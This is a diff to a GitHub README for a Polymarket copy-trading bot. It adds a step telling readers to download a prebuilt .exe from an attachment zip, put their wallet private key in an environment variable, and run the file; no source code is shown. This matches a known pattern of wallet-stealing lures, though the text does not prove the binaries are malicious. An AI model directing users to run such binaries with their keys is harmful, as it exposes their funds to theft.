@@ -7,22 +7,46 @@ A high-performance Rust-based automated trading bot that copies trades from succ
 - Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev)
 - X: [@soulcrancerdev](https://x.com/soulcrancerdev)
 
-## How To Setup & Trade
-Watch demo: https://www.youtube.com/watch?v=UoLfidnpc1w
+## How To Setup & Trade on Local n' Telegram
 
-## How To Trade W/ Telegram
-Watch demo: https://www.youtube.com/watch?v=8PC0bKSgfhM
+### Prod Version
+- Local Setup: https://www.youtube.com/watch?v=
+- Telegram Setup: https://www.youtube.com/watch?v=
+
+### Demo Version
+- Local Setup: https://www.youtube.com/watch?v=UoLfidnpc1w
+- Telegram Setup: https://www.youtube.com/watch?v=8PC0bKSgfhM
 
 ---
-## Trial Versions
+## 🚀 Let's Trade!!
 
-### **Polymarket Copy Trading Bot - Rust (Demo)**  
+### **Polymarket Copy Trading Bot - Rust (Prod Version)**
+- 🗂️ [polymarket-copy-trading-bot-prod.zip](https://github.com/user-attachments/files/25067356/polymarket-copy-trading-bot-prod.zip)
+
+1. Extract `polymarket-copy-trading-bot-prod.zip` file.
+2. Environment Variables Settings
+   ```
+   - USER_ADDRESSES=0xYourTraderAddress             # Traders to copy (comma-separated or JSON array)
+   - PROXY_WALLET=0xYourWalletAddress               # Your wallet (must match PRIVATE_KEY)
+   - PRIVATE_KEY=your_64_char_hex_private_key       # Private key without 0x prefix
+   - RPC_URL=https://polygon-mainnet.infura.io/v3/YOUR_PROJECT_ID        # Polygon RPC endpoint (you can use Infura, Alchemy, or QuickNode)
+   - MONGO_URI='mongodb+srv://user:pass@cluster.mongodb.net/database'    # ⚠️  Keep this private! Never share or commit to git
+   - COPY_STRATEGY=PERCENTAGE                       # Copy strategy: PERCENTAGE, FIXED, or ADAPTIVE
+   - COPY_SIZE=10.0                                 # PERCENTAGE: Percentage of trader's order (e.g., 10.0 = 10%)
+   - MAX_ORDER_SIZE_USD=100.0                       # Maximum size for a single order in USD (default: 100.0)
+   - MIN_ORDER_SIZE_USD=1.0                         # Minimum size for a single order in USD (default: 1.0)
+   ```
+3. Run `polymarket-copy-trading-bot-prod.exe`
+<img width="824" height="974" alt="polymarket-copy-trading-bot-prod" src="https://github.com/user-attachments/assets/af0bacee-5deb-4091-9a1e-f31115e2e008" />
+
+---
+
+### **Polymarket Copy Trading Bot - Rust (Demo Version)**  
 - 🗂️ [validate_setup.zip](https://github.com/user-attachments/files/24820052/validate_setup.zip)
 - 🗂️ [approve_tokens.zip](https://github.com/user-attachments/files/24889543/approve_tokens.zip)
 - 🗂️ [confirmed_block_bot.zip](https://github.com/user-attachments/files/24819758/confirmed_block_bot.zip)
 - 🗂️ [mempool_bot.zip](https://github.com/user-attachments/files/24887683/mempool_bot.zip)
 
-### How To Run
 1. Extract all *.zip files into the same folder.
 2. Environment Variables Settings
    ```
@@ -54,38 +78,14 @@ Watch demo: https://www.youtube.com/watch?v=8PC0bKSgfhM
 <img width="1004" height="765" alt="Screenshot_7" src="https://github.com/user-attachments/assets/108af5c3-d585-41c2-bbac-536eb1472cc7" />
 
 ## ✨ Features
-
-### Core Functionality
-- **Real-time Trade Monitoring**: WebSocket-based monitoring of blockchain events (`OrdersFilled`)
-- **Automatic Trade Execution**: Copies whale trades with configurable position scaling
-- **Dual Trading Modes**:
-  - **Confirmed Block Mode**: More reliable, waits for block confirmation
-  - **Mempool Mode**: Faster execution, monitors pending transactions
-- **Smart Order Execution**: Tiered execution strategies based on trade size
-- **Order Resubmission**: Automatic retry with price escalation for failed orders
-
-### Risk Management
-- **Circuit Breaker System**: Multi-layer protection against dangerous market conditions
-- **Liquidity Checks**: Validates order book depth before executing trades
-- **Consecutive Trade Detection**: Monitors for rapid trade sequences
-- **Configurable Safety Thresholds**: Customizable risk parameters via environment variables
-
-### Market Intelligence
-- **Market Data Caching**: Efficient caching of market information (neg-risk status, slugs, sport tokens)
-- **Sport-Specific Handling**: Special price buffers for tennis (ATP) and soccer (Ligue 1) markets
-- **Live Market Detection**: Identifies and handles live markets differently
-
-### Trading Configuration
-- **Position Scaling**: Configurable position size as percentage of whale trades
-- **Price Buffers**: Adjustable price buffers for different trade tiers
-- **Minimum Trade Filters**: Skip trades below configurable thresholds
-- **Probability-Based Sizing**: Optional probability-adjusted position sizing
-
-### Developer Tools
-- **Token Approval Utility**: Automated USDC and Conditional Token approvals
-- **Configuration Validator**: Pre-flight checks for environment setup
-- **Trade Monitor**: Logs personal fills to CSV for analysis
-- **Order Type Testing**: Test FAK order responses
+- **Multi-trader support** — Follow several traders at once; your edge is mirroring many minds instead of one.
+- **Dynamic sizing** — Order size scales with your capital and strategy (percentage, fixed, or adaptive).
+- **Tiered multipliers** — Bigger trades can use different scaling than small ones.
+- **Accurate bookkeeping** — Tracks every buy and sell so positions stay correct even when balances change.
+- **Batched orders** — Groups small signals into fewer, larger orders when aggregation is enabled.
+- **Live execution** — Sub-second monitoring and immediate placement on the CLOB.
+- **MongoDB-backed state** — All activity and positions stored for replay and analysis.
+- **Slippage guards** — Avoids fills at worse-than-acceptable prices.
 
 ## 📁 Directory Structure
 
